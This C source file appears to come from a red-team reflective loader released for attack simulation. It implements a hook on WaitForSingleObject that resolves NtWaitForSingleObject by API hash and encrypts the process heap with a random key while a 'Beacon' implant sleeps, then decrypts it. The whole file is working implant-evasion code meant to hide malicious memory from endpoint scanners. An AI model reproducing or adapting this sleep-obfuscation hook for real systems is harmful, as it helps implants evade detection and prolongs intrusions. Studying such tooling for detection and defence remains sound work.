/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( NtWaitForSingleObject );
} API ;

/* API Hashes */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Obfuscates Beacon when it calls WaitForSingleObject
 *
!*/
D_SEC( D ) DWORD WINAPI WaitForSingleObject_Hook( _In_ HANDLE hHandle, _In_ DWORD Milliseconds )
{
	API		Api;
	LARGE_INTEGER	Del;

	BYTE		Key[ 16 ];
	DWORD		Ret = 0;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );

	/* Random Key Generation */
	RandomString( &Key, sizeof( Key ) );

	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );

	/* Encrypt the heap */
	HeapEncryptDecrypt( &Key, sizeof( Key ) );

	Del.QuadPart = -10000LL * Milliseconds;
	Ret = OBF_EXECUTE( Api.NtWaitForSingleObject, hHandle, FALSE, &Del ); 

	/* Decrypt the heap */
	HeapEncryptDecrypt( &Key, sizeof( Key ) );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );

	/* Return */
	return Ret;
};
